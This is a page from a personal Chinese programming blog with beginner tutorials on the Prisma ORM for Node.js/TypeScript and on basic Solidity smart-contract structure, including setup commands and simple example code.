<!DOCTYPE html>


<html lang="zh-CN,en,zh-TW,default">
  

    <head>
      <meta charset="utf-8" />
       
      <meta name="keywords" content="java php javascript go rust 区块链 ipfs etherum 电商系统 营销系统 游戏 智能合约" />
       
      <meta
        name="viewport"
        content="width=device-width, initial-scale=1, maximum-scale=1"
      />
      <title> 张智进的博客</title>
  <meta name="generator" content="hexo-theme-ayer">
      
      <link rel="shortcut icon" href="/favicon.ico" />
       
<link rel="stylesheet" href="/dist/main.css">

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
      />
      
<link rel="stylesheet" href="/css/custom.css">
 
      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
       
 

      <link
        rel="stylesheet"
        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
      />
      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>

      <!-- mermaid -->
      
      <style>
        .swal2-styled.swal2-confirm {
          font-size: 1.6rem;
        }
      </style>
    <link rel="alternate" href="/atom.xml" title="张智进的博客" type="application/atom+xml">
</head>
  </html>
</html>


<body>
  <div id="app">
    
      
    <main class="content on">
      


<script src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js"></script>


<!-- Subtitle -->

  <script>
    try {
      var typed = new Typed("#subtitle", {
        strings: ['面朝大海，春暖花开', '愿你一生努力，一生被爱', '想要的都拥有，得不到的都释怀'],
        startDelay: 0,
        typeSpeed: 200,
        loop: true,
        backSpeed: 100,
        showCursor: true
      });
    } catch (err) {
      console.log(err)
    }
  </script>
  
<div id="main">
  <section class="outer">
  
  
  

<div class="notice" style="margin-top:50px">
    <i class="ri-heart-fill"></i>
    <div class="notice-content" id="broad"></div>
</div>
<script type="text/javascript">
    fetch('https://v1.hitokoto.cn')
        .then(response => response.json())
        .then(data => {
            document.getElementById("broad").innerHTML = data.hitokoto;
        })
        .catch(console.error)
</script>

<style>
    .notice {
        padding: 20px;
        border: 1px dashed #e6e6e6;
        color: #969696;
        position: relative;
        display: inline-block;
        width: 100%;
        background: #fbfbfb50;
        border-radius: 10px;
    }

    .notice i {
        float: left;
        color: #999;
        font-size: 16px;
        padding-right: 10px;
        vertical-align: middle;
        margin-top: -2px;
    }

    .notice-content {
        display: initial;
        vertical-align: middle;
    }
</style>
  
  <article class="articles">
    
    
    
    
    <article
  id="post-Prisma入门"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/05/16/Prisma%E5%85%A5%E9%97%A8/"
    >Prisma入门</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/05/16/Prisma%E5%85%A5%E9%97%A8/" class="article-date">
  <time datetime="2022-05-16T08:24:19.000Z" itemprop="datePublished">2022-05-16</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-JavaScript/">技术生活 - 编程技术 - JavaScript</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="Prisma-是什么"><a href="#Prisma-是什么" class="headerlink" title="Prisma 是什么"></a>Prisma 是什么</h1><p>Prisma是适用于Node.js和TypeScript的下一代开源ORM。ORM:对象关系映射（Object Relational Mapping）是一种程序设计技术。简单来说ORM可以将我们的底层数据库的各种操作进行一定的封装，我们就可以通过更加熟悉的开发语言来书写对应的数据库命令，ORM则可以将这些数据库操作命令转换为对应的SQL语句。GitHub上star数量很高，开发很活跃，社区也不错。关键是它的异步性，让JavaScript也拥有了高效查询db的能力。<br>Prisma它包含以下工具：</p>
<ul>
<li>Prisma Client—— 自动生成且类型安全的数据库客户端，这里边指定了语言和数据库啥的</li>
<li>Prisma Migrate—— 声明式数据建模和可自定义的迁移，和laravel或者thinkphp中的迁移概念类似</li>
<li>Prisma Studio—— 现代化的用户界面，可查看和编辑数据，可以想象为phhmyadmin</li>
</ul>
<h1 id="Prisma-环境配置"><a href="#Prisma-环境配置" class="headerlink" title="Prisma 环境配置"></a>Prisma 环境配置</h1><p>前提，nodejs必须安装<br>在这个前提下安装prisma</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install prisma typescript ts-node @types/node --save-dev</span><br></pre></td></tr></table></figure>


<h1 id="Prisma-基本用法"><a href="#Prisma-基本用法" class="headerlink" title="Prisma 基本用法"></a>Prisma 基本用法</h1><h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir prisma</span><br><span class="line">npm init -y </span><br></pre></td></tr></table></figure>
<p>上面的命会初始化一个npm项目，然后安装prisma依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install prisma -D </span><br></pre></td></tr></table></figure>
<p>安装之后，我们就可以使用npx命令了。 可以通过npx prisma init -h命令来查看prisma的命令<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220516164320.png" alt="20220516164320"></p>
<p>我们看到了prisma帮助信息中有一个init命令，这个就是我们用来初始化prisma的关键命令，这里我们初始化一个mysql的数据库文件</p>
<p>init指定数据库的格式是：*** DATABASE_URL&#x3D;”mysql:&#x2F;&#x2F;<USER>:<PASSWORD>@HOST:PORT&#x2F;DATABASE” ***</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npx prisma init --url mysql://root:123456@localhost:3306/mydb</span><br></pre></td></tr></table></figure>

<p>来看看，执行之后，这个命令做了那些事情</p>
<ol>
<li>生成了一个.env文件</li>
<li>生成了prisma文件夹，里面有一个schema.prisma这个文件是我们后面用到的关键</li>
</ol>
<p>在根目录目前下面的文件大致如下<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220516165016.png" alt="20220516165016"></p>
<h2 id="prisma使用"><a href="#prisma使用" class="headerlink" title="prisma使用"></a>prisma使用</h2><h3 id="使用-Prisma-Migrate-创建数据表"><a href="#使用-Prisma-Migrate-创建数据表" class="headerlink" title="使用 Prisma Migrate 创建数据表"></a>使用 Prisma Migrate 创建数据表</h3><p>目前schema.prisma文件长这样。定义了两个表模型，User和Profile ，这两个表通过userId关联</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">// This is your Prisma schema file,</span><br><span class="line">// learn more about it in the docs: https://pris.ly/d/prisma-schema</span><br><span class="line"></span><br><span class="line">generator client &#123;</span><br><span class="line">  provider = &quot;prisma-client-js&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">datasource db &#123;</span><br><span class="line">  provider = &quot;mysql&quot;</span><br><span class="line">  url      = env(&quot;DATABASE_URL&quot;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">model User &#123;</span><br><span class="line">  id      Int      @id @default(autoincrement())</span><br><span class="line">  email   String   @unique</span><br><span class="line">  name    String?</span><br><span class="line">  profile Profile?</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">model Profile &#123;</span><br><span class="line">  id     Int     @id @default(autoincrement())</span><br><span class="line">  bio    String?</span><br><span class="line">  user   User    @relation(fields: [userId], references: [id])</span><br><span class="line">  userId Int     @unique</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="使用-Prisma"><a href="#使用-Prisma" class="headerlink" title="使用 Prisma"></a>使用 Prisma</h3><p>使用迁移文件初始化数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npx prisma migrate dev --name init</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>看看执行这个命令发生了什么吧</p>
<ol>
<li>生成数据库迁移文件</li>
<li>执行数据库迁移文件<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220516170012.png" alt="20220516170012"></li>
</ol>
<p>执行CRUD<br>在执行之前需要创建一个ts文件，这里我们创建一个index.ts的文件&#96; </p>
<ol>
<li>创建一个用户<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// create </span><br><span class="line">  const  c = await prismaClient.user.create(&#123;</span><br><span class="line">     data:&#123;</span><br><span class="line">         name:&#x27;xx&#x27;,</span><br><span class="line">         email:&#x27;123@qqq.com&#x27;,</span><br><span class="line">         profile:&#123;</span><br><span class="line">             create:&#123;bio:&#x27;im a girl&#x27;&#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;,</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure></li>
<li>查询一个用户<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const user =  prismaClient.user.findFirst();</span><br><span class="line">console.dir(user, &#123; depth: null &#125;) </span><br></pre></td></tr></table></figure></li>
</ol>
<p>完整代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import &#123;  PrismaClient &#125; from &#x27;@prisma/client&#x27;</span><br><span class="line">const prismaClient = new PrismaClient();</span><br><span class="line"></span><br><span class="line">async function main() &#123; </span><br><span class="line">    // create </span><br><span class="line">    const  c = await prismaClient.user.create(&#123;</span><br><span class="line">       data:&#123;</span><br><span class="line">           name:&#x27;xx&#x27;,</span><br><span class="line">           email:&#x27;123@qqq.com&#x27;,</span><br><span class="line">           profile:&#123;</span><br><span class="line">               create:&#123;bio:&#x27;im a girl&#x27;&#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">    </span><br><span class="line">    console.log(&#x27;create user status = &#x27; + c );</span><br><span class="line">    const user =  prismaClient.user.findFirst();</span><br><span class="line">    console.dir(user, &#123; depth: null &#125;) </span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main()</span><br><span class="line">  .catch((e) =&gt; &#123;</span><br><span class="line">    throw e</span><br><span class="line">  &#125;).finally(async () =&gt; &#123;</span><br><span class="line">    await prismaClient.$disconnect()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>数据库运行效果<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220516173323.png" alt="20220516173323"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Javasctipt/" rel="tag">Javasctipt</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/NodeJS/" rel="tag">NodeJS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Prisma/" rel="tag">Prisma</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/TypeScript/" rel="tag">TypeScript</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-区块链合约之10天学会solidity第四节-基本数据结构"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/05/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E5%9B%9B%E8%8A%82-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"
    >区块链合约之10天学会solidity第四节-基本数据结构</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/05/01/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E5%9B%9B%E8%8A%82-%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" class="article-date">
  <time datetime="2022-05-01T05:30:12.000Z" itemprop="datePublished">2022-05-01</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%8C%BA%E5%9D%97%E9%93%BE/">技术生活 - 编程技术 - 区块链</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学solidity已经2年了，平日除了偶尔写一点点合约喝读一点合约之外，几乎没有用武之地（工作中也用不到）。导致目前渐渐的有些生疏了。现在捡起来，希望有人一起再次一起学习。学习学习，有输入和输出才能学的更好。所以，我计划，没两天更新一波学习记录。我会把学习记录写成系列文章，把代码放到github，期待一起进步。也请大家到我的GitHub 给我star呀！也欢迎给我留言加个好友啥的。如果给我star的，联系我我会拉个共同学习的群v（jingyiwei）。<br>GitHub：<a href="mailto:&#x67;&#x69;&#x74;&#x40;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;">&#x67;&#x69;&#x74;&#x40;&#103;&#x69;&#x74;&#x68;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;</a>:it114&#x2F;learn-solidity-30day.git<br>本文原文发表在张智进博客：<a href="https://www.memestarter.top/">https://www.memestarter.top/</a></p>
<h1 id="合约数据类型"><a href="#合约数据类型" class="headerlink" title="合约数据类型"></a>合约数据类型</h1> 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/solidity/" rel="tag">solidity</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%90%88%E7%BA%A6/" rel="tag">合约</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%99%E7%A8%8B/" rel="tag">教程</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-区块链合约之10天学会solidity第二节-初识合约"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E4%BA%8C%E8%8A%82-%E5%88%9D%E8%AF%86%E5%90%88%E7%BA%A6/"
    >区块链合约之10天学会solidity第二节-初识合约</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/30/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E4%BA%8C%E8%8A%82-%E5%88%9D%E8%AF%86%E5%90%88%E7%BA%A6/" class="article-date">
  <time datetime="2022-04-30T10:44:32.000Z" itemprop="datePublished">2022-04-30</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%8C%BA%E5%9D%97%E9%93%BE/">技术生活 - 编程技术 - 区块链</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学solidity已经2年了，平日除了偶尔写一点点合约喝读一点合约之外，几乎没有用武之地（工作中也用不到）。导致目前渐渐的有些生疏了。现在捡起来，希望有人一起再次一起学习。学习学习，有输入和输出才能学的更好。所以，我计划，没两天更新一波学习记录。我会把学习记录写成系列文章，把代码放到github，期待一起进步。也请大家到我的GitHub 给我star呀！也欢迎给我留言加个好友啥的。如果给我star的，联系我我会拉个共同学习的群v（jingyiwei）。<br>GitHub：<a href="mailto:&#x67;&#x69;&#116;&#64;&#103;&#x69;&#116;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#109;">&#x67;&#x69;&#116;&#64;&#103;&#x69;&#116;&#104;&#x75;&#98;&#46;&#x63;&#x6f;&#109;</a>:it114&#x2F;learn-solidity-30day.git<br>本文原文发表在张智进博客：<a href="https://www.memestarter.top/">https://www.memestarter.top/</a></p>
<h1 id="合约结构"><a href="#合约结构" class="headerlink" title="合约结构"></a>合约结构</h1><h2 id="最简单的合约"><a href="#最简单的合约" class="headerlink" title="最简单的合约"></a>最简单的合约</h2><p>下面来看一段最简单的合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract SimpleStorage &#123;</span><br><span class="line">    string message;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分开来看</p>
<ul>
<li>第一行，代表合约所使用的许可证。不写也无所谓，不会报错；同时使用&#x2F;&#x2F;符号注释这一行，代表这一行不会被编译器编译</li>
<li>第二行，pragma 编译器指令 告诉编译器 合约使用 solidity编程语言，最低只是的solidity语言版本是 0.4.0。需要注意的是，pragma指令只对当前的文件起作用。^0.4.0 表示可以使用的版本为 0.4.0-0.4.9  之间的任意版本，但不能超过 0.5.0 版本。0.4.0-0.4.9 之间的小版本改动通常不会有破坏性更改，源代码应该都是兼容的。</li>
<li>第三行，创建了一个名字为 “SimpleStorage”的合约。</li>
<li>第四行，合约中，定义了一个变量message</li>
</ul>
<h2 id="合约编译"><a href="#合约编译" class="headerlink" title="合约编译"></a>合约编译</h2><p><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220506180910.png" alt="20220506180910"></p>
<h2 id="合约部署"><a href="#合约部署" class="headerlink" title="合约部署"></a>合约部署</h2><p><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220506181410.png" alt="20220506181410"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/solidity/" rel="tag">solidity</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%90%88%E7%BA%A6/" rel="tag">合约</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%95%99%E7%A8%8B/" rel="tag">教程</a></li></ul>

    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-区块链合约之10天学会solidity第三节-合约结构"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2022/04/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E4%B8%89%E8%8A%82-%E5%90%88%E7%BA%A6%E7%BB%93%E6%9E%84/"
    >区块链合约之10天学会solidity第三节-合约结构</a> 
</h2>
 

      
    </header>
     
    <div class="article-meta">
      <a href="/2022/04/29/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%90%88%E7%BA%A6%E4%B9%8B10%E5%A4%A9%E5%AD%A6%E4%BC%9Asolidity%E7%AC%AC%E4%B8%89%E8%8A%82-%E5%90%88%E7%BA%A6%E7%BB%93%E6%9E%84/" class="article-date">
  <time datetime="2022-04-29T00:40:30.000Z" itemprop="datePublished">2022-04-29</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%8A%80%E6%9C%AF%E7%94%9F%E6%B4%BB-%E7%BC%96%E7%A8%8B%E6%8A%80%E6%9C%AF-%E5%8C%BA%E5%9D%97%E9%93%BE/">技术生活 - 编程技术 - 区块链</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>学solidity已经2年了，平日除了偶尔写一点点合约喝读一点合约之外，几乎没有用武之地（工作中也用不到）。导致目前渐渐的有些生疏了。现在捡起来，希望有人一起再次一起学习。学习学习，有输入和输出才能学的更好。所以，我计划，没两天更新一波学习记录。我会把学习记录写成系列文章，把代码放到github，期待一起进步。也请大家到我的GitHub 给我star呀！也欢迎给我留言加个好友啥的。如果给我star的，联系我我会拉个共同学习的群v（jingyiwei）。<br>GitHub：<a href="mailto:&#103;&#105;&#116;&#x40;&#x67;&#105;&#116;&#104;&#117;&#x62;&#x2e;&#x63;&#x6f;&#109;">&#103;&#105;&#116;&#x40;&#x67;&#105;&#116;&#104;&#117;&#x62;&#x2e;&#x63;&#x6f;&#109;</a>:it114&#x2F;learn-solidity-30day.git<br>本文原文发表在张智进博客：<a href="https://www.memestarter.top/">https://www.memestarter.top/</a></p>
<h1 id="合约结构"><a href="#合约结构" class="headerlink" title="合约结构"></a>合约结构</h1><p>在上一篇中初步认识了合约，下面看一下在合约中都有哪些重要的构成。这一节的目的是的对合约有一个大致的印象。不会说太多的细节，只是我们可以在宏观上知道合约的构成，在后面的学习中做到心中有数。</p>
<p>solidity中合约其他面向对象编程语言中的类比较类似。在其他编程语言中类声明，变量声明等特性在合约中大致都可以找到相关的影子。只不过是换了个名字而已。</p>
<p>合约中可以包含大致有状态变量、 函数、 函数修饰器、事件、 结构类型、枚举类型，并合约也有继承机制</p>
<h2 id="状态变量"><a href="#状态变量" class="headerlink" title="状态变量"></a>状态变量</h2><p>状态变量存储在内存中，按照java或者别的面向对象的语言来理解，可以理解为类的成员变量。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string message; // 状态变量 ，消息</span><br></pre></td></tr></table></figure>


<h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><p>函数是为了完成一些具有一定功能的代码的集合，可以被合约内部或者外部调用（注意函数的修饰符）<br>例如,下边是一个名称是setMessage的函数，接受一个string类型的参数，函数的可见性是public意味着在其他合约中也可以被调用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 设置消息函数</span><br><span class="line">    function setMessage(string amsg) public  isOwner &#123;  </span><br><span class="line">        message = amsg;</span><br><span class="line">        emit MessageChanged(msg.sender,amsg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="修饰器"><a href="#修饰器" class="headerlink" title="修饰器"></a>修饰器</h2><p>如上面的函数。函数的调用必须受到isOwner的限制。如果不是owener调用函数，就会报错。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 修饰器，这里判断交易是否是合约创建者发起交易</span><br><span class="line">   modifier isOwner() &#123;</span><br><span class="line">       require(msg.sender == owner, &quot;Caller is not owner&quot;);</span><br><span class="line">       _;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>


<h2 id="合约事件"><a href="#合约事件" class="headerlink" title="合约事件"></a>合约事件</h2><p>合约事件可以把合约运行过程中的事情给抛出去。关注这个事件的使用方可以关注并且根据事件做出自己的响应。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 定义事件</span><br><span class="line">   event MessageChanged(address addr,string message);</span><br></pre></td></tr></table></figure>



<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>其实，合约如果理解为一个java或者c#或者php等面向对象语言中的一个类，就会好很多。这篇文章只是简单的列举了合约中的一些成员，函数，事件等。没有涉及的内容太多，这里我们对合约结构有一个大致印象即可。</p>
<p>下面是一个完整的代码 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract SimpleStorage   &#123;</span><br><span class="line">    string message; // 状态变量 ，消息</span><br><span class="line">    address private owner;  // 状态变量 ，合约部署者</span><br><span class="line"></span><br><span class="line">    // 定义事件</span><br><span class="line">    event MessageChanged(address addr,string message);</span><br><span class="line"></span><br><span class="line">    // 构造方法，部署合约的时候调用</span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // 修饰器，这里判断交易是否是合约创建者发起交易</span><br><span class="line">    modifier isOwner() &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Caller is not owner&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 设置消息函数</span><br><span class="line">    function setMessage(string amsg) public  isOwner &#123;  </span><br><span class="line">        message = amsg;</span><br><span class="line">        emit MessageChanged(msg.sender,amsg);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 读取消息函数</span><br><span class="line">    function getMessage() external  view  returns (string)&#123;</span><br><span class="line">        return message;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>部署合约之后，我们就可以在remix ide里面调用 setMessage，然后调用 getMessage  就会看到我们刚才设置的 message<br><img src="https://cdn.jsdelivr.net/gh/it114/blogcdn@master/blog/images20220508214200.png" alt="20220508214200"></p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
